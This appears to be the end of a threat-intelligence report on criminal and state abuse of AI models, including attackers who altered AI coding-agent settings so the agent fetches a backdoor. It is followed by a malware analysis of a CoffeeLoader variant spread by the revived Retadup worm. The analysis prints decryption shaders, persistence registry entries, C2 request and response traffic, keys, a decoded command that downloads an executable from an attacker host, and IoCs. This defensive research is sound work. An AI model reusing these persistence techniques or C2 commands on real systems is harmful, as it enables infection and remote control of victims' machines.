fulfillment, for example, operators may partner with separate threat actors who establish initial access to compromised environments, purchase compromised credentials from infostealer operators, or recruit partners to systematically register free trial accounts. GTIG analyzed numerous LLMJacking vendor advertisements on Russian- and Chinese-language underground marketplaces, and found that most services offer access to multiple models, including frontier and jailbroken models that advertise support of malicious cyber activity. Advertised pricing varies significantly across individual mixer platforms and based on the models and types of credentials offered; for example, free trial credentials were much cheaper than enterprise. We observed prices per million tokens range from $0.10 USD to $25 USD. One vendor, APIMart, applies a 5x price increase on both input and output once a prompt exceeds 100,000 tokens. Rather than pricing per million tokens, some vendors such as JetNight offer monthly subscriptions at differing prices based on the type of model offered. Figure 6: APIMart advertised prices Threat Actors Continue Using AI for Productivity Gains Since our last report , GTIG has continued to observe threat actors leveraging LLMs to augment various phases of the attack lifecycle. However, widespread adoption of LLM tooling also introduces significant operational drawbacks. The forensically noisy nature of many LLM tool processes can degrade OPSEC and compromise stealth, creating a detrimental impact on espionage campaigns. In addition, LLMs can reduce operational reliability, as adversaries must contend with model limitations, including the hallucination of non-existent details or even targets. Consequently, we anticipate that actors who specialize in stealthy operations designed to maintain long-term persistence are less likely to rely on forensically noisy tools within a targeted environment, though they may employ them selectively for speed and scale, depending on operational priorities. Conversely, we assess with high confidence that actors less concerned with operational stealth, including many cyber crime actors, will continue incorporating autonomous offensive tools into their operations, given that the increased reach of their campaigns will likely compensate for any decreases in success rates. Government-backed threat actors State-sponsored threat actors continue to leverage LLMs in their respective operations, reinforcing baseline assessments communicated in our previous reports. For example, we continue to see CALANQUE ION, an Iranian government-backed actor previously tracked as APT42 , leverage LLMs—including Gemini—to augment reconnaissance and targeted social engineering. We also see PRC-nexus threat actors leveraging LLMs for reconnaissance and research. In addition to this new baseline of threat actors leveraging LLMs, we observed the following activity: In Q3 2026, PRC-nexus cyber espionage actors used LLM tools and models for reconnaissance, front-end scanning, researching targets across various sectors and geographies, and weaponizing exploits. We have also observed threat actors using LLMs to conduct post-compromise data analysis. This includes PRC contractor LEAKY CASTLE, which overlaps with public reporting about data leaked from a contractor using LLMs to analyze, translate, and understand exfiltrated data, including deriving insights into organizational structures and adding them into finished intelligence reports to sell to customers. In a new trend, we have observed PRC-nexus actors abusing LLM platforms and file-hosting backends for staging, dead drop C2s, and exfiltration. In one example, a threat actor abused a frontier model's file-hosting infrastructure to stage lure archives and exfiltrate stolen data, and a backend API to exfiltrate stolen intranet documents. We also continue to see threat actors from the Democratic People’s Republic of Korea (DPRK) using LLM tools to support DPRK IT worker activity, such as generating resumes and preparing for job interviews at Western organizations. DPRK threat actors are also abusing generative tools for operational scaling and exploiting native agent execution hooks as enterprise access vectors. We observed the use of public facing tools to generate responses during job screenings, allowing them to sound authentic while posing as Western IT workers to secure remote employment. While we continue to see DPRK actors leveraging LLM-powered tools to generate lure content and assist with coding, over the course of 2026 we’ve observed an evolution of tactics. In multiple intrusions, a suspected MIDNIGHT NEPTUNE threat cluster combined LLM-enabled social engineering and abused organizations' AI tools as a supply chain attack vector. In recent intrusions targeting cryptocurrency organizations in North America and Europe, the threat actor exploited LLM software architectures as a lateral execution surface. For initial access, the actor created fraudulent recruiter profiles on professional networking platforms whose profile imagery contained SynthID watermarks, confirming use of LLMs to synthesize deceptive professional identities. These personas directed targets to fraudulent meeting platforms featuring "ClickFix" social engineering lures, which prompted targets to run diagnostic fix scripts, which executed likely LLM-authored staging scripts via ClickFix lures. Following initial compromise, the actor pivoted into internal code repositories to execute a supply chain vector internal to the organization: modifying .claude/settings.json configuration files so that when users started up Claude Code, it would automatically trigger the download of the SOMBERMEME backdoor. To maintain stealth, suspected MIDNIGHT NEPTUNE further masked its lateral movement by generating GitHub Personal Access Tokens (PATs) named after Microsoft Copilot, underscoring how threat actors are simultaneously abusing generative tools for operational scaling and exploiting native AI agent execution hooks as enterprise access vectors. LLM Toolkits Offer Turnkey Cyber Crime Solutions In developments in the last quarter, in addition to the use of offensive frameworks in financially motivated activity, we observed cybercrime actors leverage LLMs to scale tooling for clients; for example, Phishing-as-a-Service (PhaaS) operators using LLMs to create tools for low-sophisticated adversaries. The Jieyou phishing service, an active Chinese-language PhaaS platform first observed in March 2026, is primarily used by cybercriminals to deploy and manage highly convincing phishing campaigns, with a particular focus on e-commerce fraud. The service introduced an LLM chatbot assistant in its June 2026 backend update. This chatbot allows threat actors to easily configure phishing panels and modify existing templates using natural language commands, significantly lowering the technical barrier for deploying campaigns. The backend chatbot is model-agnostic and integrates with several frontier and open source platforms via APIs. The evolution of the Jieyou platform highlights a growing industry trend where PhaaS providers leverage LLMs as a modular force multiplier. Rather than manually editing payloads, low-skilled affiliates can now utilize natural language through the chatbot to dynamically customize pretext lures and phishing interfaces on the fly. Mitigations These activities triggered Gemini's safety responses, and Google took additional, broader action to disrupt the threat actors' campaigns. Additionally, we've taken action against these actors by disabling the assets associated with this activity and making updates to prevent further misuse. Google DeepMind has used these insights to strengthen both classifiers and our models, enabling them to refuse to assist with these types of attacks. How Google Protects Against AI Abuse Google uses a multifaceted defense strategy to protect our users and infrastructure against LLM abuse, integrating proactive model-level safeguards, specialized threat intelligence, targeted containment protocols, and proactive red teaming to simulate and protect against threats. Additionally, as innovation moves forward, the industry needs security standards for building and deploying AI responsibly, which is why we introduced the Secure AI Framework (SAIF) , a conceptual framework to secure AI systems. Proactive Model and Platform Defenses We continuously harden our models against misuse by feeding insights from active threat monitoring directly into our safety classifiers and guardrails. For instance, in response to model extraction—or “distillation”—attacks, we have deployed real-time defenses designed to degrade the performance of unauthorized "student" models and detect attempts to clone proprietary logic. When we identify bad actors, we take direct action to disrupt their operations by disabling associated projects and accounts. To extend these protections to enterprise customers, we developed Google AI Threat Defense (AITD) . This autonomous architecture operationalizes security by bringing together the reasoning power of Gemini and other frontier models, the risk prioritization of Wiz, the automated remediation capabilities of Gemini and CodeMender, and frontline intelligence from Mandiant. AITD employs a multi-model strategy that balances cost and coverage, using light models for continuous scanning and specialized frontier models for high-risk vulnerabilities. In addition to our proactive platform defenses, we’ve recently introduced Gemini 4 Carbon, our strongest model with state-of-the-art cybersecurity and long horizon capabilities. Google has built Gemini 4 Carbon with layered defenses against cyber misuse—combining safety training, input/output classifiers, activation-based introspection probes and chain-of-thought and agentic trajectory monitors—designed to block requests to develop functional, weaponized exploits or malware tooling. The robustness of these safeguards has been stress-tested by both internal red teams and specialized external partners including Gray Swan and Trajectory labs. Beyond the model itself, Google continuously monitors for intentional misuse in production, limits or disables access for offending accounts, and provides vetted defenders, security researchers, and government partners access to advanced dual-use cyber capabilities through the Fairwind Program. More information on the safety, security, and alignment testing conducted on Gemini 4 Carbon can be found in the Gemini 4 Carbon Safety & Security Report . Building AI Safely and Responsibly Google’s approach to AI is guided by a commitment to bold innovation and responsible development. Guided by our AI Principles , Google designs AI systems with robust security and safety guardrails, which are continuously tested to ensure resilience. Our policy guidelines and prohibited use policies are foundational to ensuring safety. Our policy development process is built to anticipate emerging trends and design for security from the ground up, allowing us to enhance protections for users globally. At Google, threat intelligence is a core component of our security posture. We actively investigate abuse of our platforms—including malicious cyber activities by government-backed threat actors—and collaborate with law enforcement when appropriate. Crucially, our learnings from every countermeasure we implement are fed back into our product development to improve the security for our AI models. These iterative improvements to our classifiers and model-level safeguards are vital to maintaining agility against evolving threats. Our LLM development and Trust & Safety teams also work in constant concert with our threat intelligence, security, and modeling experts to effectively address misuse.

items.title: A USB worm’s second life: Retadup spreading CoffeeLoader
items.detail: In August 2026, we detected a new variant of the CoffeeLoader malware in the wild. On launch, the NSIS-based installer executable dropped a file named 7z.dll into a temporary directory and ran it through rundll32.exe. The 7z.dll file was a patched version of the original library of the popular 7-Zip archiver. Part of its code had been replaced with malicious self-decrypting shellcode that turned out to be a new version of the Armoury packer. This packer was also previously used in the CoffeeLoader Trojan. New Armoury variant The old variant of the Armoury packer used the GPU to decrypt the Trojan’s main body, relying on the OpenCL library, which implements the standard of the same name for high-performance computing. __kernel void f(__global char* a,__global char* b,__global char* c,int d) { c[get_global_id(0)] = a[get_global_id(0)] ^ b[get_global_id(0) % d]; } The new variant also utilizes the GPU, but instead of OpenCL, it uses the OpenGL library, which implements the eponymous standard for applications that work with 2D and 3D graphics. layout(local_size_x = 256) in; layout(std430, binding = 0) buffer DataBuffer { uint data[]; }; layout(std430, binding = 1) buffer KeyBuffer { uint key[]; }; layout(std430, binding = 2) buffer ResultBuffer { uint result[]; }; void main() { uint index = gl_GlobalInvocationID.x; if (index >= data.length()) { return; } uint dataValue = data[index]; uint keyValue = key[index]; result[index] = dataValue ^ keyValue; } The Armoury payload has also changed. Previously, it was a DLL containing two shellcode fragments and the main body of CoffeeLoader. The first shellcode is a dropper responsible for installing the Trojan and gaining persistence. To do this, it copies the library to Windows folders and adds it to autorun. The second is a stager that creates a new dllhost.exe process and injects the main body of CoffeeLoader into it; in this variant, the main body is an executable file. Unlike the old version, the new version of the packer delivers yet another shellcode. CoffeeLoader downloader The shellcode decrypted by the Armoury packer is a new intermediate link in the infection chain: the CoffeeLoader downloader. It fully incorporates the dropper and stager functionality described above, as well as downloader functions used to fetch the Trojan’s main body. New CoffeeLoader downloader viewed in a text editor To establish persistence, the Trojan copies 7z.dll to subfolders of %PROGRAMDATA% or %LOCALAPPDATA%. The Run registry key is used for autorun. The subfolder, library, and registry value are named with eight hexadecimal digits generated from system volume information. C:\ProgramData\b79faace\b79faace.dll C:\Users\[username]\AppData\Local\b79faace\b79faace.dll Software\Microsoft\Windows\CurrentVersion\Run 'b79faace.dll' = 'rundll32.exe "C:\ProgramData\b79faace\b79faace.dll",SetCodecs' To protect itself, the downloader creates a registry key that prevents the user from disabling autorun through Task Manager. Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run 'b79faace.dll' = [080000000000000000000000] Once persistence is established, the malware launches one of several processes (dllhost.exe, WerFault.exe, svchost.exe, OpenWith.exe, or AtBroker.exe), injects itself into it, and downloads the Trojan’s main body from a hardcoded C2 server address. The download is performed over HTTPS using the /payload?md5= path. On the first request to the server, the md5 parameter is set to zeros. On subsequent requests, it contains the hash of the previously downloaded payload. Example of a request to download the main body of CoffeeLoader: GET /payload?md5=00000000000000000000000000000000 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Host: api.internet-speed-check.com Example of a server response: HTTP/1.1 200 OK Date: Tue, 29 Sep 2026 14:34:25 GMT Content-Type: application/octet-stream Content-Length: 60800 Connection: close Server: cloudflare x-content-md5: d7785198d9341310978e4cedc7bdb735 x-signature: MEUCIDQNr86sBN3hmnLarIuPJ2WJEtXeIdnfsR4AkHUBI0AtAiEAyV5o2VM+LPDbme8nYdRydkrtI02TzyNdKh7+AdvPzUs= strict-transport-security: max-age=63072000; includeSubdomains x-frame-options: DENY x-content-type-options: nosniff cf-cache-status: DYNAMIC Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800} Server-Timing: cfCacheStatus;desc="DYNAMIC" Server-Timing: cfEdge;dur=4,cfOrigin;dur=66 Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=AAAAAAAA"}]} CF-RAY: cf27d75a42bb5669-MIA alt-svc: h3=":443"; ma=86400 In response to the request, the C2 returns encrypted shellcode that contains the main body of the Trojan. The payload is encrypted with a simple XOR, and the first 16 bytes of the downloaded data serve as the key. The HTTP response header also contains two fields: X-Signature and X-Content-MD5 . The first contains a signature for the downloaded data, which is verified with a public key embedded in the Trojan. RUNTMSAAAAC2gVlbqvpsSutLE0/4ogdQ20Uw4qQyQQCw7448NvjMOaYWr+mlrvWiDCg79jWIhjiIuGuqxTb9VMsuceH4WyA5 The second field contains the MD5 checksum of the decrypted payload body. If both the signature and the checksum checks pass, the Trojan allocates executable memory in its own process and transfers control to the downloaded and decrypted shellcode. Main CoffeeLoader module Once it gains control, the shellcode decrypts and sets up the main body of CoffeeLoader, then passes control to it. The Trojan itself hasn’t changed much since previous campaigns. In the new version, the attackers use different keys to encrypt requests to the C2 and decrypt its responses: A21251838432306F2CD2540593656B9E and 2026F751079659CF71C7BA64B345C12A. Certificate validation during the connection to the C2 has been replaced with signature verification of the C2 responses, which relies on the public key 23:6A:0D:E7:E0:FA:20:BC:0F:F4:7C:F6:8F:49:89:A8:10:BE:91:F0:0F:C2:F3:99:4D:46:F7:DF:D2:33:0B:00:6D:54:7A:AA:92:45:89:16:84:48:2E:AF:B8:F7:75:8A:4C:39:07:C5:24:EA:9D:3A:C6:FD:13:61:7D:54:19:FA. The binary communication protocol no longer uses the magic constant 0xC0FFEE42 , which gave the malware its name: it now uses the far less telling value 0xD1D57871 . However, we found no changes in functionality. The code contains the same three previously described commands for running a payload received from the C2: injecting it into a process, saving it to disk as an executable and then running it, or saving it as a DLL and running it via rundll32.exe. Distribution and initial infection The most notable finding was how exactly this CoffeeLoader variant spreads. Malware is most often distributed through email attachments, websites posing as free software download portals, ad banners that send users who click them through a chain of redirects to phishing resources, pirated software, and so on. CoffeeLoader infections, however, come from the Retadup worm. Retadup is a malicious computer worm first discovered in 2017. It was written in the AutoIt and AutoHotkey scripting languages. Once on a victim’s device, it copied itself to all connected USB flash drives and external drives as hidden files and shortcuts (LNK files). When a user opened the infected flash drive on another PC and clicked the shortcut, the worm made its way onto the new device. Systems infected with Retadup were joined into a botnet that could download and run additional malware on the operator’s command. In July 2019, French law enforcement gained access to Retadup’s C2 servers and took control of the botnet. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm body from the system. Within just a few weeks, more than 850,000 machines were disinfected, and the botnet ceased to exist… until 2024. Two years ago, someone began re-registering the domain names that Retadup had used as C2 servers and using them to issue commands to download third-party malware. At first, this was the SmokeLoader downloader packed using the 32-bit version of Armoury, but in early 2025, the same servers started serving CoffeeLoader. We don’t know whether it was the worm’s author or someone else that decided to revive the C2 servers, since Retadup’s C2 protocol is fairly simple: it consists of plaintext commands encoded with Base64 and then converted to hex. Below is an example of traffic from a 2017 Retadup variant that still communicates successfully with its C2 in 2026. GET /FD0C7EE872277F33E3335530299B836A/1/4/1/0/empty HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko Host: noobminer.newblackage.com HTTP/1.1 200 OK Server: nginx Date: Thu, 06 Aug 2026 04:07:32 GMT Content-Type: text/html Content-Length: 68 Connection: keep-alive ::62327438664878386332786c5a5841744e6a41774d4441774c584e735a575677:: decoded command: "ok||||sleep-600000-sleep" HTTP/1.1 200 OK Server: nginx Date: Mon, 10 Aug 2026 04:18:43 GMT Content-Type: text/html Content-Length: 180 Connection: keep-alive ::623274386648783849475276643235736232466b4c576830644841364c79397964584a715a6e5a754c6e4a7a4c3356775a4746305a53356c654755364954703163475268644755755a58686c4c575276643235736232466b:: decoded command: "ok|||| download-http://rurjfvn.rs/update.exe:!:update.exe-download" Geography When the Retadup botnet was taken down in 2019, the reported figure was 850,000 disinfected systems. Our statistics for the first three quarters of this year show that the new campaign is much smaller in scale. Our solutions blocked Retadup worm infection attempts on around 15,000 systems, most of them in Peru, Angola, Russia, and Bolivia. IoC Most active Retadup C2 servers alphanoob[.]com newblackage[.]com newminersage[.]com radnewage[.]com minernewage[.]com rad2016.publicvm[.]com radpal.publicvm[.]com roro2016.linkpc[.]net CoffeeLoader C2 internet-speed-check[.]com Servers hosting CoffeeLoader files rurjfvn[.]rs/update.exe alphanoob[.]com/update.exe CoffeeLoader MD5 (DLL files) 2272dde17925d6179bea6fcf4d543d20 dce55eec553f6af16ba6481eaacb8638 449c9e8bc6eb308aa3c46c88959e1a4f CoffeeLoader MD5 (NSIS-based installers) 58886d45a0c5e802a5d0a7545c36112d cca710c5455c1fe2732771afbac16a09
